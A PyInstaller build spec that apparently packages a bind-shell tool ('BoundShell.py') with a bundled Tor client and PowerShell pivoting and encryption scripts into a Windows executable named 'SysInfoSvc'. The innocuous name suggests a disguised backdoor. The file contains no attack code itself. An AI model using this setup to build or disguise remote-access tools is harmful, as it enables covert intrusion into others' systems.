# -*- mode: python -*-

block_cipher = None


a = Analysis(['BoundShell.py'],
             pathex=['C:\\Users\\jmgonzalez\\PycharmProjects\\WBindShell'],
             binaries=[],
             datas=[
                ("bin\\libeay32.dll", "."),
                ("bin\\libevent_core-2-0-5.dll", "."),
                ("bin\\libevent_extra-2-0-5.dll", "."),
                ("bin\\libevent-2-0-5.dll", "."),
                ("bin\\libgcc_s_sjlj-1.dll", "."),
                ("bin\\libssp-0.dll", "."),
                ("bin\\ssleay32.dll", "."),
                ("bin\\tor.exe", "."),
                ("bin\\tor-gencert.exe", "."),
                ("bin\\zlib1.dll", "."),
                ("scripts\\ImAes.ps1", "."),
                ("scripts\\PivotTool.ps1", ".")
             ],
             hiddenimports=[
                "os",
                "gc",
                "sys",
                "json",
                "time",
                "stem",
                "queue",
                "shlex",
                "base64",
                "socket",
                "requests",
                "threading",
                "subprocess",
                "socketserver",
                "stem.control",
                "stem.process",
                "pyotp",
                "stem.util"
             ],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher,
             noarchive=False)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='SysInfoSvc',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          runtime_tmpdir=None,
          console=True , icon='.\\images\\exe.ico')
